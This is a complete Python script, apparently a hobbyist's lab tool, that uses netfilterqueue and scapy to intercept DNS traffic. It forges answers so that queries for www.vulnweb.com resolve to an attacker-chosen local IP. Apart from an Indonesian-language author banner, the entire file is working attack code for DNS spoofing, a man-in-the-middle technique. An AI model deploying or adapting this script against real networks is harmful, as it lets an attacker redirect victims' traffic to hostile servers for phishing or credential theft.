#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def proseskardus_nuz(kardus):
    kardusscapy = scapy.IP(kardus.get_payload())
    if kardusscapy.haslayer(scapy.DNSRR):
        qname = kardusscapy[scapy.DNSQR].qname
        if "www.vulnweb.com" in qname.decode():
            print("\n[!] doi BERHASIL dibelokkan [!]")
            penutupan = '''
                   dibuat dengan niat oleh 
                    ______   _ _   _ _   _ _______________
                   |__  / | | | \ | | | | |__  /__  /__  /
                     / /| | | |  \| | | | | / /  / /  / / 
                    / /_| |_| | |\  | |_| |/ /_ / /_ / /_ 
                   /____|\___/|_| \_|\___//____/____/____|

                   https://steamcommunity.com/id/zunuzzz/

                   =========GUNAKAN DENGAN BIJAK=========
                   '''

            print(penutupan)
            jawab = scapy.DNSRR(rrname=qname, rdata="192.168.78.145") #ipmu
            kardusscapy[scapy.DNS].an = jawab
            kardusscapy[scapy.DNS].ancount = 1

            del kardusscapy[scapy.IP].len
            del kardusscapy[scapy.IP].chksum
            del kardusscapy[scapy.UDP].chksum
            del kardusscapy[scapy.UDP].len

            kardus.set_payload(bytes(kardusscapy))

    kardus.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, proseskardus_nuz)
queue.run()


